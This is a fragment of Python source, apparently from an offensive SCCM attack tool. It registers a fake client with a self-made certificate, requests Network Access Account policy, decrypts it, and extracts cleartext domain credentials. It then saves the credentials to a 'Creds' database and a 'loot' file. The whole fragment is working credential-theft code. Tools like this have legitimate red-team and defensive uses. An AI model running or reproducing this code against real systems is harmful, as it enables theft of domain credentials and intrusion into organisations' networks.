                #logger.info("[+] Got NAA credential: " + clear_user + ":" + clear_pass)
                self.write_to_db(clear_user, clear_pass)
            #Tools.write_to_csv(cred_dict, self.logs_dir)

        except ET.ParseError as e:
            print(f"An error occurred while parsing the XML: {e}")
        except Exception as e:
            print(e)
        # cursor.execute(f'''insert into SiteServers (Hostname, SiteCode, SigningStatus, SiteServer, Active, Passive, MSSQL) values (?,?,?,?,?,?,?)''',
        #                 (result, '', '', 'True', '', '', '')) 

    def write_to_db(self, username, password):
        source = "HTTP NAA"
        database = f"{self.logs_dir}/db/find.db"
        conn = sqlite3.connect(database, check_same_thread=False)
        cursor = conn.cursor()
        check = "select * from Creds where Username = ?"
        cursor.execute(check, (username,))
        exists = cursor.fetchone()
        if not exists:
            cursor.execute(f'''insert into Creds (Username, Password, Source) values (?,?,?)''', (username, password, source))
            conn.commit()
        return
    
    
    def sccmwtf_run(self):

        #logger.debug("[*] Creating certificate for our fake server...")

        self.createCertificate(True)
        
        #logger.debug("[*] Registering our fake server...")
        uuid = self.sendRegistration(self._target_name, self._target_fqdn, self.target_username, self.target_password)

        self.rename_key(uuid)
        #logger.info(f"[*] Done.. our ID is {uuid}")



        # If too quick, SCCM requests fail (DB error, jank!)
        #logger.info(f"[*] Waiting {self.sleep} seconds for database to update.")
        time.sleep(self.sleep)

        #logger.debug("[*] Requesting NAAPolicy.. 2 secs")

        urls = self.sendPolicyRequest(self._target_name, self._target_fqdn, uuid, self._target_name, self._target_fqdn, uuid)

        #logger.debug("[*] Parsing for Secretz...")

        for url in urls:
            result = self.requestPolicy(url)
            if result.startswith("<HTML>"):
                try:
                    result = self.requestPolicy(url, uuid, True, True)
                    decryptedResult = self.parseEncryptedPolicy(result)
                    self.parse_xml(decryptedResult)
                    file_name = f"{self.logs_dir}/loot/naapolicy.xml"
                    Tools.write_to_file(decryptedResult, file_name)
                    #logger.info(f"[+] Done.. decrypted policy dumped to {self.logs_dir}/loot/naapolicy.xml")
                    return True
                except:
                    pass
                    #logger.info(f"[-] Something went wrong.")
        return False
                
        
 
